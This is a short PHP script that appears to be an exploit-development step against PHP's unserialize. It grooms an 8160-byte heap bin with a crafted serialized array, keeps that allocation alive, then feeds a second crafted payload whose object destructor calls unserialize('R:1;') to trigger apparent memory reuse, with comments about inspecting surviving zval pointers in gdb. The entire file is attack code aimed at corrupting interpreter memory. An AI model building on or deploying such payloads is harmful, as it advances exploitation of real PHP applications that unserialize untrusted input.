<?php
/* L1-b: groom the 8160-byte bin with a prior unserialize's var_entries
 * extension (its data[] holds zval* pointers), keep that array alive, then
 * run the vulnerable payload with no spray. gdb dumps the reused chunk at
 * the nested parse so we can see whether valid zval* pointers survive. */
function payload_keep() {
    $N = 1016;
    $p = 'a:' . ($N + 2) . ':{';
    for ($i = 0; $i < $N; $i++) { $p .= 'i:0;N;'; }
    /* last element a string: the extension data[] points at the array zvals */
    $p .= 'i:99999;N;i:99999;s:6:"HELLO!";}';
    return $p;
}
function payload_vuln() {
    $N = 1016;
    $p = 'a:' . ($N + 2) . ':{';
    for ($i = 0; $i < $N; $i++) { $p .= 'i:0;N;'; }
    $p .= 'i:99999;O:1:"T":0:{}i:99999;i:42;}';
    return $p;
}
class T {
    public function __destruct() {
        @unserialize('R:1;');
    }
}
$GLOBALS['keep'] = @unserialize(payload_keep());   // free its extension, keep zvals
@unserialize(payload_vuln());
